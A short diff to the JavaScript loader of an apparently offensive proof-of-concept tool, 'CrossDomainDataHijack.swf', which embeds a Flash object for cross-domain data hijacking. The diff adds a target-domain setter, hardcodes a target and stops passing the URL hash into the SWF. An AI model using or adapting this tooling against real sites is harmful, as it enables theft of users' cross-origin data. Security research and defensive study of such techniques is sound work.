@@ -1,5 +1,10 @@
 var crossdomain = {
     /*
+     * Set the domain to reach.
+     * @type string
+     */
+    'target' : '',
+    /*
      * attributes for the object tag.
      * @type object
      */
@@ -52,7 +57,16 @@ var crossdomain = {
         
         html += '</object>';
         document.write(html);
+    },
+    /*
+     * Set the domain to target
+     * @param string target
+     * @return void
+     */
+    'setTarget' : function(target) {
+        this.target = target;
     }
 };
 sendToJavaScript = crossdomain.callback;
-crossdomain.create('CrossDomainDataHijack.swf?input=' + location.hash.substr(1));
+crossdomain.setTarget('http://www.olivierbeg.nl/');
+crossdomain.create('CrossDomainDataHijack.swf');
